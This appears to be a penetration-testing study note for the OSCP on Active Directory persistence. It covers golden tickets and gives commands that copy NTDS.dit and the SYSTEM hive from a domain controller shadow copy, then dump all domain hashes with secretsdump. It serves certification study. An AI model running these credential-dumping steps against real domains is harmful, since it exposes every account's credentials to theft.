---
title: "AD Persistence"
slug: ad-persistence
category: notes
handbook: oscp
tags: ["active-directory", "persistence"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-08T22:27:09+03:00
description: "Persistence keeps access to a domain after full compromise."
---
Persistence keeps access to a domain after full compromise. It is not scored on the OSCP, which ends at Domain Admin, and is kept here only for course completeness; none of it is needed to pass the exam.

Two items from the PEN-200 persistence module:

- **Golden ticket** from the `krbtgt` hash: a forged TGT for any user, valid until `krbtgt` rotates twice. See [Silver and Golden Tickets](/collections/oscp/silver-and-golden-tickets).
- **`ntds.dit` via shadow copy**: with admin on the DC, snapshot the volume and extract `ntds.dit` and the SYSTEM hive offline, yielding every domain hash without touching the live directory.

```bash
# on the DC (admin shell): snapshot, then copy the locked files out
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\system.hive

# on Kali: extract the hashes offline
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

[DCSync](/collections/oscp/dcsync) pulls the same hashes remotely with no shell on the DC, so the shadow-copy route is a fallback for when DCSync is not possible.
